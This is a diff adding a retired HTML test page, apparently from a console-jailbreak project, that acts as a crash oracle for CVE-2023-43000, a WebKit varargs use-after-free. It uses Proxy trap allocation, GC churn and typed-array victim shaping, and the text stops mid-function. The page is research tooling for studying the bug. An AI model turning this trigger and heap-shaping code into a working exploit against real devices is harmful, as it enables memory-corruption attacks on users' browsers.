@@ -1,0 +1,905 @@
+<!doctype html>
+<!-- ===================================================================
+     PARKED-DEAD (2026-11-11) — CVE-2023-43000 oracle, RETIRED FROM SERVICE.
+
+     The trigger is UNREACHABLE on this build (docs/NDAYS-V2.md section 1
+     + section 4): the vulnerable MarkedVector::fill at
+     llint/LLIntSlowPaths.cpp:2318 lives inside handleVarargsCheckpoint,
+     whose ONLY dispatch path is llint_slow_path_checkpoint_osr_exit ->
+     popCheckpointOSRSideState; the sole side-state creator is
+     dfg/DFGOSRExit.cpp:239, and DFG is compiled out of this no-JIT
+     build -- nothing ever pushes the side state, so the buggy fill can
+     never run for the right reason. Plain f(...x) uses the stack-based
+     varargsSetup path instead.
+
+     Kept under pages/parked/ for archaeology; NOT auto-registered by
+     portal.py (only pages/*.html at the top level register), NOT
+     force-swappable, NOT listed in the live kit. Do not re-activate
+     without a new reachability proof of the full caller chain.
+     =================================================================== -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network sign-in</title>
+<style>
+  /* Self-contained: no external assets ever leave this page. Same dark
+     card as the other rig pages. */
+  html, body { margin: 0; padding: 0; background: #101318; color: #e8eaf0;
+               font-family: sans-serif; }
+  #rig-card { max-width: 900px; margin: 24px auto; padding: 20px 24px;
+              background: #1a1f2b; border: 1px solid #2c3446; border-radius: 10px; }
+  #rig-card h1 { font-size: 24px; margin: 0 0 4px 0; }
+  #rig-card h2 { font-size: 14px; font-weight: normal; color: #8f9ab3;
+                 margin: 0 0 16px 0; }
+  #rig-state { display: inline-block; padding: 2px 10px; border-radius: 6px;
+               font-size: 14px; background: #3a4460; }
+  #rig-state.done { background: #2e6b3a; }
+  #rig-state.hit { background: #7a2e35; }
+  #rig-state.failed { background: #7a2e35; }
+  table { width: 100%; border-collapse: collapse; font-size: 17px; }
+  td { padding: 5px 6px; border-bottom: 1px solid #262d3d; vertical-align: top; }
+  td.k { color: #9fb0d8; white-space: nowrap; width: 40%; }
+  td.v { word-break: break-all; font-family: monospace; font-size: 15px; }
+  .note { color: #8f9ab3; font-size: 13px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div id="rig-card">
+  <h1>Network sign-in</h1>
+  <h2>MarkedVector::fill varargs GC-rooting oracle &mdash; BarbarismJB
+      webkit-rig varargs (CVE-2023-43000 class, phased; SAFE timing oracle
+      by default)</h2>
+  <div id="rig-state">BOOT</div>
+  <table id="rig-rows">
+    <tr><td class="k">user agent</td><td class="v" id="rig-ua">probing&hellip;</td></tr>
+    <tr><td class="k">page url</td><td class="v" id="rig-url">&nbsp;</td></tr>
+    <tr><td class="k">phase gate</td><td class="v" id="rig-gate">asking rig&hellip;</td></tr>
+    <tr><td class="k">phase 1 &mdash; timing oracle</td><td class="v" id="rig-p1">pending</td></tr>
+    <tr><td class="k">phase 2 &mdash; GC pressure</td><td class="v" id="rig-p2">pending</td></tr>
+    <tr><td class="k">phase 3 &mdash; victim shaping</td><td class="v" id="rig-p3">pending</td></tr>
+    <tr><td class="k">verdict</td><td class="v" id="rig-verdict">pending</td></tr>
+    <tr><td class="k">telemetry</td><td class="v" id="rig-post">pending</td></tr>
+  </table>
+  <div class="note">Phase 1 is a pure timing/side-effect oracle (NO forced
+      GC). Phases 2/3 run ONLY after the bench operator advances the
+      rig-side gate: <tt>curl -X POST http://RIG/rig/phase -d
+      '{"phase":2}'</tt> (local only). A crash mid-run leaves an "armed"
+      localStorage marker; the next load reports it. Page marker varargs
+      (see docs/RIG.md).</div>
+</div>
+<noscript><div style="color:#e8eaf0;padding:20px">
+  JavaScript did not run: the applet blocked scripting or the page did not
+  load. Record this -- it is a negative result for the oracle.</div></noscript>
+<script>
+/* BarbarismJB webkit-rig varargs page: CVE-2023-43000 crash oracle.
+ *
+ * PROVENANCE -- BUILT FROM THE BUG AS VERIFIED IN OUR OWN TREE
+ * (vendor/nintendo-oss/NS2_23.0.0/NS2_23.0.0/webkit_3.12.11, the frozen
+ * OSS drop of the console engine):
+ *
+ *   - runtime/ArgList.h:219-228 -- MarkedVector::fill(count, func) sets
+ *     m_size = count and invokes func(&slotFor(0)) with NO m_markSet->add
+ *     of the buffer and no zeroing. slowAppend (the normal append path)
+ *     is what registers the heap buffer with the GC; fill() bypasses
+ *     append entirely, so once count > inlineCapacity (8) the malloc'd
+ *     JSValue buffer is NOT a GC root while func runs. (Upstream fix for
+ *     CVE-2023-43000 adds the mark-set registration inside fill.)
+ *   - llint/LLIntSlowPaths.cpp:2305-2312 (handleVarargsCheckpoint) --
+ *     MarkedArgumentBuffer args; args.fill(argumentCountIncludingThis-1,
+ *     [&](JSValue* buffer) { loadVarargs(...); }); the functor is the
+ *     copy loop itself.
+ *   - interpreter/Interpreter.cpp:260-300 (loadVarargs) -- default
+ *     branch for non-array objects: for (; i < length; ++i) {
+ *     firstElementDest[i] = object->get(globalObject, i + offset); }
+ *     object->get runs GENERIC gets -- Proxy get traps and prototype
+ *     getters execute USER JS here, allocating, while the destination
+ *     buffer is unrooted. A GC in that window frees cells the loop is
+ *     still copying -> UAF (crash, or stale JSValues in the callee).
+ *   - LLInt is the ONLY tier that runs on this console build (JIT off),
+ *     and handleVarargsCheckpoint IS the LLInt slow path -- the bug class
+ *     is reachable on-device precisely because there is no JIT to route
+ *     around it.
+ *   - bytecompiler/NodesCodegen.cpp:2090-2098 -- in this 613-era fork,
+ *     f(...args) lowers to OpCallVarargs directly; Reflect.apply
+ *     (:2272) and f.apply (:2308) do too. The page exercises apply
+ *     (varargs on every engine shape) and spread (this fork's exact
+ *     lowering) both.
+ *
+ * PHASES (config constants in CFG; all run counts/knobs at the top):
+ *   1 (default, SAFE): timing/side-effect oracle only. For each source
+ *     shape (plain array baseline, getter object, Proxy get-trap):
+ *     run apply/spread R times, count traps fired vs expected (length
+ *     read + one per index), verify the callee saw exactly `count` args
+ *     with an intact checksum, record per-run timings under interleaved
+ *     allocation pressure. NO forced GC storm. Divergence in trap counts,
+ *     arg counts, or checksums is a signal even without a crash.
+ *   2 (rig gate >= 2): escalating GC-pressure rounds. The trap itself
+ *     allocates (string ropes + ArrayBuffers) and a side loop churns
+ *     CFG.CHURN_BYTES between applies; run count and churn size are
+ *     ladder knobs. Armed-marker before each round; crash-suffix
+ *     telemetry like fontchain (marker reported on the next load).
+ *   3 (rig gate >= 3): reserved stub -- victim shaping, READ-ONLY
+ *     analysis: typed-array views interleaved in the marshalled args;
+ *     after each pressured apply every victim's bytes are verified.
+ *     No exploitation.
+ *
+ * The gate: GET /rig/phase returns the rig-side phase; ?phase=N can only
+ * LOWER the effective phase below the rig flag, never raise it.
+ *
+ * Every phase POSTs detailed telemetry. ES5-only like the other rig
+ * pages. The server templates {{RIG_HOST}}/{{RIG_PORT}}; unfilled tokens
+ * (file opened directly) fall back to location.host.
+ */
+
+var RIG_SCHEMA = 1;
+var RIG_PAGE = "varargs";
+var RIG_HOST = "{{RIG_HOST}}";
+var RIG_PORT = "{{RIG_PORT}}";
+var RIG_FILLED = RIG_HOST.indexOf("{{") !== 0;
+var RIG_BASE = RIG_FILLED
+    ? "http://" + RIG_HOST + ":" + RIG_PORT
+    : (location.protocol + "//" + location.host);
+
+/* ------------------------------------------------- config constants */
+var CFG = {
+  /* trigger geometry: count must exceed MarkedArgumentBuffer's inline
+   * capacity (8) so fill() mallocs the unrooted heap buffer */
+  P1_ARGS: 64,                     /* phase-1 argument count             */
+  P1_RUNS: 64,                     /* phase-1 runs per shape             */
+  P1_PRESSURE_BYTES: 1 << 22,      /* 4 MiB interleaved pressure         */
+  P2_ARGS: 128,                    /* phase-2 argument count             */
+  P2_RUNS_PER_ROUND: 8,            /* applies per pressure round         */
+  P2_CHURN_LADDER: [4, 16, 64, 256],  /* MiB churned between applies    */
+  TRAP_ALLOC_COUNT: 32,            /* allocations performed inside trap  */
+  TRAP_ALLOC_BYTES: 1024,          /* bytes per trap allocation          */
+  P3_ARGS: 96,                     /* phase-3 argument count             */
+  P3_VICTIMS: 16,                  /* typed-array victims interleaved    */
+  P3_VICTIM_LEN: 64,               /* bytes per victim                   */
+  P3_RUNS: 4,                      /* pressured applies                  */
+  ROUND_BUDGET_MS: 6000,           /* per-round wall clock               */
+  SETTLE_MS: 50                    /* idle gap between rounds            */
+};
+
+var R = {
+  schema: RIG_SCHEMA,
+  page: "varargs",
+  phase: "boot",
+  seq: 0,
+  startedAt: (new Date()).toISOString(),
+  stage: "boot",
+  rig: { templated: RIG_FILLED ? (RIG_HOST + ":" + RIG_PORT) : null,
+         base: RIG_BASE, pageHost: location.host },
+  location: { url: location.href, referrer: document.referrer || null },
+  env: { userAgent: navigator.userAgent },
+  gate: { rigPhase: null, requestedPhase: null, effectivePhase: null,
+          priorCrash: false },
+  p1: { shapes: [], verdict: null },
+  p2: { rounds: [], verdict: null },
+  p3: null,
+  verdict: null,
+  cfg: {
+    p1Args: CFG.P1_ARGS, p1Runs: CFG.P1_RUNS,
+    p2Args: CFG.P2_ARGS, p2RunsPerRound: CFG.P2_RUNS_PER_ROUND,
+    churnLadderMiB: CFG.P2_CHURN_LADDER.slice(),
+    trapAlloc: [CFG.TRAP_ALLOC_COUNT, CFG.TRAP_ALLOC_BYTES],
+    p3Victims: [CFG.P3_VICTIMS, CFG.P3_VICTIM_LEN, CFG.P3_RUNS]
+  },
+  errors: []
+};
+
+function fail(stage, e) {
+  if (R.errors.length < 20) {
+    R.errors.push({ stage: stage, error: String(e && e.message ? e.message : e) });
+  }
+}
+function $(id) { return document.getElementById(id); }
+function setRow(id, text) { try { $(id).textContent = String(text); } catch (e) {} }
+function setState(text, cls) {
+  try { var el = $("rig-state"); el.textContent = text;
+        el.className = cls || ""; } catch (e) {}
+}
+function nowMs() {
+  try {
+    if (typeof performance !== "undefined" && performance &&
+        typeof performance.now === "function") {
+      return performance.now();
+    }
+  } catch (e) {}
+  return Date.now();
+}
+function r2(x) { return Math.round(x * 100) / 100; }
+function r3(x) { return Math.round(x * 1000) / 1000; }
+function probe(stage, fn) {
+  try { return fn(); } catch (e) { fail(stage, e); return null; }
+}
+function median(arr) {
+  var c = arr.slice(0).sort(function (a, b) { return a - b; });
+  return c.length ? c[Math.floor(c.length / 2)] : null;
+}
+
+/* ------------------------------------------------------- transport */
+function sendJson(url, obj, cb) {
+  var payload;
+  try { payload = JSON.stringify(obj); }
+  catch (e) { fail("post.stringify", e); cb(false); return; }
+  if (typeof fetch === "function") {
+    fetch(url, { method: "POST",
+                 headers: { "Content-Type": "application/json" },
+                 body: payload })
+      .then(function (res) { cb(!!res && res.ok); })
+      .catch(function () { viaXhr(url, payload, cb); });
+    return;
+  }
+  viaXhr(url, payload, cb);
+}
+function viaXhr(url, payload, cb) {
+  if (typeof XMLHttpRequest === "undefined") { cb(false); return; }
+  var done = false;
+  function finish(ok) { if (!done) { done = true; cb(ok); } }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.timeout = 5000;
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) { finish(xhr.status >= 200 && xhr.status < 300); }
+    };
+    xhr.onerror = function () { finish(false); };
+    xhr.ontimeout = function () { finish(false); };
+    xhr.send(payload);
+  } catch (e) { fail("post.xhr", e); finish(false); }
+}
+var BACKOFF_MS = [250, 500, 1000, 2000, 4000, 8000];
+function postReport(phase, cb) {
+  var attempts = 0;
+  function attempt() {
+    attempts++;
+    R.phase = phase;
+    R.seq++;
+    sendJson(RIG_BASE + "/report", R, function (ok) {
+      if (ok) { cb(true, attempts); return; }
+      if (attempts <= BACKOFF_MS.length) {
+        setRow("rig-post", "retry " + attempts + " in " + BACKOFF_MS[attempts - 1] + "ms");
+        setTimeout(attempt, BACKOFF_MS[attempts - 1]);
+      } else { cb(false, attempts); }
+    });
+  }
+  attempt();
+}
+function getJson(url, cb, timeoutMs) {
+  var settled = false;
+  var to = setTimeout(function () {
+    if (!settled) { settled = true; cb(null, "timeout"); }
+  }, timeoutMs || 4000);
+  if (typeof fetch === "function") {
+    fetch(url)
+      .then(function (res) { return res.json(); })
+      .then(function (j) {
+        if (!settled) { settled = true; clearTimeout(to); cb(j, null); }
+      })
+      .catch(function (e) {
+        if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); }
+      });
+    return;
+  }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.timeout = timeoutMs || 4000;
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && !settled) {
+        settled = true; clearTimeout(to);
+        if (xhr.status >= 200 && xhr.status < 300) {
+          try { cb(JSON.parse(xhr.responseText), null); }
+          catch (e) { cb(null, "bad json"); }
+        } else { cb(null, "HTTP " + xhr.status); }
+      }
+    };
+    xhr.onerror = function () {
+      if (!settled) { settled = true; clearTimeout(to); cb(null, "xhr.error"); }
+    };
+    xhr.send();
+  } catch (e) { if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); } }
+}
+
+/* ------------------------------------------------- crash-oracle marker */
+var MARKER_KEY = "varargs:last-run";
+function armMarker(tag) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "armed", tag: tag,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function disarmMarker(tag, verdict) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "done", tag: tag,
+                                                     verdict: verdict,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function checkPriorCrash() {
+  try {
+    var raw = localStorage.getItem(MARKER_KEY);
+    if (!raw) { return null; }
+    var m = JSON.parse(raw);
+    return m && m.state === "armed" ? m : null;
+  } catch (e) { return null; }
+}
+
+/* ----------------------------------------------------- trigger shapes */
+/* The sink: records exactly what the callee observed. args integrity is a
+ * numeric checksum -- stale JSValues from a GC window show up as wrong
+ * sums, wrong typeof mix, or a torn length. State is published ON the
+ * function object so callers read sink.lastCount/lastSum/lastBad. */
+var sinkState = null;
+function makeSink() {
+  sinkState = { calls: 0, lastCount: -1, lastSum: null, lastBad: null,
+                thisSeen: null };
+  var sink = function () {
+    sinkState.calls++;
+    sinkState.lastCount = arguments.length;
+    sinkState.thisSeen = this;
+    var sum = 0, i, bad = null;
+    for (i = 0; i < arguments.length; i++) {
+      var v = arguments[i];
+      if (typeof v !== "number") { bad = "arg" + i + ":" + typeof v; }
+      else { sum += v; }
+    }
+    sinkState.lastSum = sum;
+    if (bad) { sinkState.lastBad = bad; }
+    sink.lastCount = sinkState.lastCount;
+    sink.lastSum = sinkState.lastSum;
+    sink.lastBad = sinkState.lastBad;
+    sink.calls = sinkState.calls;
+    return arguments.length;
+  };
+  sink.lastCount = -1;
+  sink.lastSum = null;
+  sink.lastBad = null;
+  sink.calls = 0;
+  return sink;
+}
+
+/* Counting shapes: every get fires the counter; index gets return i,
+ * the length get returns the configured count. expectedGets per apply =
+ * 1 (length) + count (indices) -- divergence means reentry or a stale
+ * copy loop reading indices twice / out of order. */
+function makeShapes(count, trapAlloc) {
+  var shapes = [];
+  var t0;
+
+  shapes.push({
+    name: "array-baseline",
+    expectedGets: 0,               /* plain array: quick path, no JS gets */
+    make: function () {
+      var a = [], i;
+      for (i = 0; i < count; i++) { a.push(i); }
+      return a;
+    },
+    gets: function () { return 0; }
+  });
+
+  shapes.push({
+    name: "getter-object",
+    expectedGets: count,           /* indices via prototype getters */
+    make: function () {
+      var o = { length: count }, i;
+      for (i = 0; i < count; i++) {
+        (function (idx) {
+          Object.defineProperty(o, String(idx), {
+            get: function () {
+              o.__gets = (o.__gets || 0) + 1;
+              if (trapAlloc) { trapAllocate(); }
+              return idx;
+            },
+            configurable: true
+          });
+        })(i);
+      }
+      return o;
+    },
+    gets: function (o) { return o.__gets || 0; }
+  });
+
+  shapes.push({
+    name: "proxy-get-trap",
+    expectedGets: count + 1,       /* length read + one per index */
+    make: function () {
+      var n = 0;
+      var counter = function () { return n; };
+      var p = new Proxy({ length: count }, {
+        get: function (target, key) {
+          n++;
+          if (trapAlloc) { trapAllocate(); }
+          /* the counter must be reachable THROUGH the trap itself --
+           * attaching it after construction would be intercepted */
+          if (key === "__count") { return counter; }
+          if (key === "length") { return count; }
+          if (/^\d+$/.test(String(key))) { return parseInt(key, 10); }
+          return undefined;
+        }
+      });
+      return p;
+    },
+    gets: function (p) { return p.__count(); }
+  });
+
+  return shapes;
+}
+
+/* allocation performed INSIDE the trap (the GC window is between
+ * loadVarargs' object->get calls) */
+var trapScratch = [];
+function trapAllocate() {
+  var i;
+  for (i = 0; i < CFG.TRAP_ALLOC_COUNT; i++) {
+    var s = "";
+    var j;
+    for (j = 0; j < 8; j++) { s += "t" + j; }        /* small rope */
+    trapScratch.push(s + trapScratch.length);
+    if (trapScratch.length > 4096) { trapScratch = []; }
+  }
+}
+/* side-loop churn: big transient allocations to force collections */
+function churn(bytes) {
+  var chunks = Math.max(1, Math.floor(bytes / (1 << 20)));
+  var keep = [], i;
+  for (i = 0; i < chunks; i++) {
+    keep.push(new ArrayBuffer(1 << 20));
+    if (keep.length > 4) { keep.shift(); }            /* rolling window */
+  }
+  return chunks;
+}
+
+/* one apply through the varargs path (op_call_varargs on every engine) */
+function applyShape(sink, argsObj) {
+  return Reflect.apply(sink, null, argsObj);
+}
+/* spread call: OpCallVarargs in THIS fork's bytecode generator (see
+ * provenance); falls back to apply-equivalent on engines that lower
+ * spread to the iterator protocol -- the shape list records which */
+var spreadShim = (function () {
+  try {
+    /* compile the spread form once; syntax support implies the path */
+    var f = new Function("sink", "obj", "return sink(...obj);");
+    return f;
+  } catch (e) { return null; }
+})();
+
+/* ------------------------------------------------------ phase 1 */
+function phase1(cb) {
+  var shapes = makeShapes(CFG.P1_ARGS, false);   /* no trap allocation */
+  var results = [];
+  var idx = 0;
+
+  function finishP1() {
+    var clean = true, i;
+    for (i = 0; i < results.length; i++) {
+      /* the spread shape is diagnostic (its verdict maps the engine's
+       * lowering, not corruption); only the three apply shapes gate) */
+      if (results[i].applyShape && results[i].verdict !== "CONSISTENT") {
+        clean = false;
+      }
+    }
+    R.p1.shapes = results;
+    R.p1.verdict = clean ? "BASELINE-CONSISTENT" : "DIVERGENCE";
+    setRow("rig-p1", R.p1.verdict + " (" + results.length + " shapes)");
+    cb(clean);
+  }
+
+  /* 4th entry in the chain: does THIS engine lower f(...proxy) to
+   * op_call_varargs (our fork does) or to the iterator protocol? A
+   * varargs-lowering engine fires the get traps exactly like apply; an
+   * iterator engine throws (non-iterable) -- either outcome is signal. */
+  function runSpreadShape() {
+    var rec;
+    if (!spreadShim) {
+      rec = { name: "proxy-spread", applyShape: false,
+              verdict: "UNSUPPORTED",
+              reason: "spread syntax not parseable" };
+    } else {
+      probe("p1.proxy-spread", function () {
+        var shape = shapes[2];             /* the proxy-get-trap shape */
+        var sink = makeSink();
+        var obj = shape.make();
+        var t0 = nowMs(), exc = null;
+        try { spreadShim(sink, obj); } catch (e) { exc = String(e).slice(0, 160); }
+        rec = {
+          name: "proxy-spread", applyShape: false,
+          ms: r3(nowMs() - t0),
+          exception: exc,
+          trapGets: shape.gets(obj),
+          expectedGetsVarargsLowering: shape.expectedGets,
+          calleeSaw: sink.lastCount,
+          /* varargs lowering: traps fired, callee got `count` args */
+          verdict: (exc === null && shape.gets(obj) > 0) ? "SPREAD-VARARGS-LIKE"
+              : (exc && /iterable|Symbol\.iterator/i.test(exc)
+                 ? "SPREAD-ITERATOR-PROTOCOL" : "SPREAD-THREW")
+        };
+      });
+      if (!rec) {
+        rec = { name: "proxy-spread", applyShape: false,
+                verdict: "PROBE-THREW" };
+      }
+    }
+    results.push(rec);
+    setRow("rig-p1", "proxy-spread: " + rec.verdict);
+    finishP1();
+  }
+
+  function runShape() {
+    if (idx >= shapes.length) { return runSpreadShape(); }
+    var shape = shapes[idx];
+    var pushed = false;
+    probe("p1." + shape.name, function () {
+      var sink = makeSink();
+      var timings = [], i, t0, res;
+      var expectedSum = (CFG.P1_ARGS * (CFG.P1_ARGS - 1)) / 2;
+      var anomalies = [];
+      var obj = null, getCount = 0;
+      var getCounts = [];
+      for (i = 0; i < CFG.P1_RUNS; i++) {
+        obj = shape.make();
+        t0 = nowMs();
+        res = applyShape(sink, obj);
+        timings.push(r3(nowMs() - t0));
+        /* interleave pressure between runs: timing under pressure vs not
+         * is the raw signal; NO forced GC storm in phase 1 */
+        if ((i & 7) === 7) { churn(CFG.P1_PRESSURE_BYTES); }
+        getCount = shape.gets(obj);
+        getCounts.push(getCount);
+        if (sink.lastCount !== CFG.P1_ARGS) {
+          anomalies.push({ run: i, calleeSaw: sink.lastCount,
+                           expected: CFG.P1_ARGS });
+        }
+        if (sink.lastSum !== expectedSum) {
+          anomalies.push({ run: i, sum: sink.lastSum, expected: expectedSum });
+        }
+        if (sink.lastBad) {
+          anomalies.push({ run: i, badArg: sink.lastBad });
+        }
+      }
+      /* trap-count oracle: the ABSOLUTE get count is engine shape (some
+       * engines read `length` twice, probe Symbol.iterator, etc); the
+       * corruption signal is VARIANCE across runs (double-callback /
+       * reentry) -- a stable count is calibration, a moving one is the
+       * anomaly, even without a crash */
+      var distinct = {}, k;
+      for (k = 0; k < getCounts.length; k++) { distinct[getCounts[k]] = 1; }
+      var distinctCount = 0;
+      for (k in distinct) { distinctCount++; }
+      if (distinctCount > 1) {
+        anomalies.push({ trapVariance: getCounts.slice(0, 16) });
+      }
+      results.push({
+        name: shape.name,
+        applyShape: true,
+        runs: CFG.P1_RUNS, args: CFG.P1_ARGS,
+        getsModel: { expected: shape.expectedGets,
+                     observed: getCount },
+        getsStable: distinctCount === 1,
+        trapCountConsistent: anomalies.length === 0,
+        checksumOk: sink.lastSum === expectedSum,
+        calleeCountOk: sink.lastCount === CFG.P1_ARGS,
+        timingsMs: { min: r3(Math.min.apply(null, timings)),
+                     med: r3(median(timings)),
+                     max: r3(Math.max.apply(null, timings)),
+                     samples: timings.slice(0, 12) },
+        anomalies: anomalies.slice(0, 8),
+        verdict: anomalies.length === 0 ? "CONSISTENT" : "DIVERGENT"
+      });
+      /* calibration for phases 2/3: the phase-1 observed stable get
+       * count is the baseline pressured runs must reproduce; the engine
+       * delta (e.g. Chrome's extra length read) carries across arg
+       * counts as a constant */
+      if (shape.name === "proxy-get-trap" && distinctCount === 1) {
+        R.p1.calibratedProxyGets = getCount;
+        R.p1.proxyGetDelta = getCount - (CFG.P1_ARGS + 1);
+      }
+      setRow("rig-p1", shape.name + ": " +
+             results[results.length - 1].verdict);
+      pushed = true;
+    });
+    if (!pushed) {
+      /* a shape probe that dies outright must still appear in telemetry */
+      results.push({ name: shape.name, applyShape: true,
+                     verdict: "PROBE-THREW",
+                     lastError: (R.errors[R.errors.length - 1] || {}).error });
+      setRow("rig-p1", shape.name + ": PROBE-THREW");
+    }
+    idx++;
+    setTimeout(runShape, CFG.SETTLE_MS);
+  }
+  runShape();
+}
+
+/* ------------------------------------------------------ phase 2 */
+function phase2(cb) {
+  var shapes = makeShapes(CFG.P2_ARGS, true);   /* traps allocate now */
+  var rounds = [];
+  var rIdx = 0;
+
+  function runRound() {
+    if (rIdx >= CFG.P2_CHURN_LADDER.length) {
+      var signaled = false, i, j;
+      for (i = 0; i < rounds.length; i++) {
+        for (j = 0; j < rounds[i].applies.length; j++) {
+          if (rounds[i].applies[j].verdict !== "OK") { signaled = true; }
+        }
+      }
+      R.p2.rounds = rounds;
+      R.p2.verdict = signaled ? "PRESSURE-SIGNAL" : "PRESSURE-CLEAN";
+      setRow("rig-p2", R.p2.verdict);
+      disarmMarker("p2", R.p2.verdict);
+      cb(signaled);
+      return;
+    }
+    var mib = CFG.P2_CHURN_LADDER[rIdx];
+    var tag = "p2:r" + rIdx + ":" + mib + "MiB";
+    armMarker(tag);
+    var round = { churnMiB: mib, applies: [], startedAt: new Date().toISOString() };
+    var aIdx = 0;
+    var roundT0 = nowMs();
+
+    function runApply() {
+      if (aIdx >= CFG.P2_RUNS_PER_ROUND ||
+          nowMs() - roundT0 > CFG.ROUND_BUDGET_MS) {
+        rounds.push(round);
+        rIdx++;
+        setRow("rig-p2", "round " + rIdx + "/" + CFG.P2_CHURN_LADDER.length +
+               " (" + mib + " MiB, " + round.applies.length + " applies)");
+        /* mid-phase telemetry: a crash in a later round still leaves the
+         * earlier rounds on the bench */
+        postReport("progress", function () {});
+        setTimeout(runRound, CFG.SETTLE_MS);
+        return;
+      }
+      var shape = shapes[2];                /* proxy-get-trap shape */
+      /* expected get count = model + phase-1-calibrated engine delta */
+      var delta = (typeof R.p1.proxyGetDelta === "number")
+          ? R.p1.proxyGetDelta : 0;
+      var expectedGets = (CFG.P2_ARGS + 1) + delta;
+      probe("p2.apply", function () {
+        var sink = makeSink();
+        var expectedSum = (CFG.P2_ARGS * (CFG.P2_ARGS - 1)) / 2;
+        var t0 = nowMs();
+        var exc = null, res;
+        var obj = null;
+        try {
+          churn(mib << 20);                 /* side-loop churn BEFORE apply */
+          obj = shape.make();
+          res = applyShape(sink, obj);
+        } catch (e) {
+          exc = String(e && e.message ? e.message : e).slice(0, 200);
+        }
+        var rec = {
+          run: aIdx, ms: r3(nowMs() - t0),
+          exception: exc,
+          calleeSaw: sink.lastCount,
+          expected: CFG.P2_ARGS,
+          sum: sink.lastSum, expectedSum: expectedSum,
+          trapGets: (obj && typeof shape.gets === "function")
+              ? shape.gets(obj) : null,
+          expectedGets: expectedGets,
+          badArg: sink.lastBad || null
+        };
+        rec.verdict = (exc === null && rec.calleeSaw === CFG.P2_ARGS &&
+                       rec.sum === expectedSum &&
+                       rec.trapGets === expectedGets &&
+                       !rec.badArg) ? "OK" : "SIGNAL";
+        round.applies.push(rec);
+      });
+      aIdx++;
+      setTimeout(runApply, CFG.SETTLE_MS);
+    }
+    runApply();
+  }
+  runRound();
+}
+
+/* ------------------------------------------------------ phase 3 */
+/* reserved stub: victim shaping, READ-ONLY. Typed-array victims are
+ * interleaved into the marshalled args; each pressured apply is followed
+ * by a byte-for-byte verification of every victim. Backing-store reuse
+ * through the unrooted-buffer window would surface as flipped bytes or
+ * a detached view -- this phase only MEASURES, it never exploits. */
+function phase3(cb) {
+  var out = { attempted: true, runs: [], verdict: null };
+  R.p3 = out;
+
+  function buildRun() {
+    var n = CFG.P3_ARGS, victims = [], victimIdx = {}, i, j;
+    for (i = 0; i < CFG.P3_VICTIMS; i++) {
+      var slot = Math.floor((i + 1) * n / (CFG.P3_VICTIMS + 1));
+      victimIdx[slot] = true;
+      var u8 = new Uint8Array(CFG.P3_VICTIM_LEN);
+      for (j = 0; j < u8.length; j++) { u8[j] = (slot + j) & 255; }
+      victims.push({ slot: slot, bytes: u8 });
+    }
+    var expected = victims.map(function (v) {
+      return { slot: v.slot,
+               bytes: Array.prototype.slice.call(v.bytes) };
+    });
+    var gets = 0;
+    var p = new Proxy({ length: n }, {
+      get: function (target, key) {
+        gets++;
+        trapAllocate();
+        if (key === "length") { return n; }
+        if (/^\d+$/.test(String(key))) {
+          var idx = parseInt(key, 10);
+          for (var i2 = 0; i2 < victims.length; i2++) {
+            if (victims[i2].slot === idx) { return victims[i2].bytes; }
+          }
+          return idx;
+        }
+        return undefined;
+      }
+    });
+    return { proxy: p, victims: victims, expected: expected,
+             getGets: function () { return gets; } };
+  }
+  function verify(run) {
+    var bad = [], i, j;
+    for (i = 0; i < run.victims.length; i++) {
+      var v = run.victims[i], want = run.expected[i].bytes;
+      if (detachedVictim(v)) { bad.push({ slot: v.slot, detached: true }); continue; }
+      for (j = 0; j < want.length; j++) {
+        if (v.bytes[j] !== want[j]) {
+          bad.push({ slot: v.slot, at: j, got: v.bytes[j], want: want[j] });
+          break;
+        }
+      }
+    }
+    return bad;
+  }
+  function detachedVictim(v) {
+    try { return v.bytes.byteLength !== CFG.P3_VICTIM_LEN; }
+    catch (e) { return true; }
+  }
+  function detectedRemovedBuffer(v) {
+    try { return v.bytes.byteLength === 0; } catch (e) { return true; }
+  }
+
+  var runIdx = 0;
+  var p3delta = (typeof R.p1.proxyGetDelta === "number")
+      ? R.p1.proxyGetDelta : 0;
+  function next() {
+    if (runIdx >= CFG.P3_RUNS) {
+      out.verdict = out.runs.length &&
+          out.runs.some(function (r) { return r.bad.length > 0; })
+          ? "VICTIM-CORRUPTION" : "VICTIM-INTACT";
+      setRow("rig-p3", out.verdict);
+      disarmMarker("p3", out.verdict);
+      cb();
+      return;
+    }
+    var tag = "p3:run" + runIdx;
+    armMarker(tag);
+    probe("p3.run" + runIdx, function () {
+      var run = buildRun();
+      var sink = makeSink();
+      var t0 = nowMs(), exc = null;
+      try {
+        churn(CFG.P2_CHURN_LADDER[1] << 20);    /* mid-ladder pressure */
+        applyShape(sink, run.proxy);
+      } catch (e) { exc = String(e && e.message ? e.message : e).slice(0, 200); }
+      var bad = verify(run);
+      out.runs.push({
+        run: runIdx, ms: r3(nowMs() - t0), exception: exc,
+        calleeSaw: sink.lastCount, badArg: sink.lastBad || null,
+        trapGets: run.getGets(), expectedGets: (CFG.P3_ARGS + 1) + p3delta,
+        badVictims: bad, victimsChecked: CFG.P3_VICTIMS
+      });
+    });
+    runIdx++;
+    setTimeout(next, CFG.SETTLE_MS);
+  }
+  next();
+}
+
+/* ------------------------------------------------------------ verdict */
+function computeVerdict() {
+  var p1clean = R.p1.verdict === "BASELINE-CONSISTENT";
+  if (R.gate.priorCrash) { return "PRIOR-RUN-CRASHED"; }
+  if (R.p2.verdict === "PRESSURE-SIGNAL") { return "PRESSURE-SIGNAL"; }
+  if (R.p3 && R.p3.verdict && R.p3.verdict.indexOf("VICTIM") === 0) {
+    return R.p3.verdict;
+  }
+  if (!p1clean) { return "P1-DIVERGENCE"; }
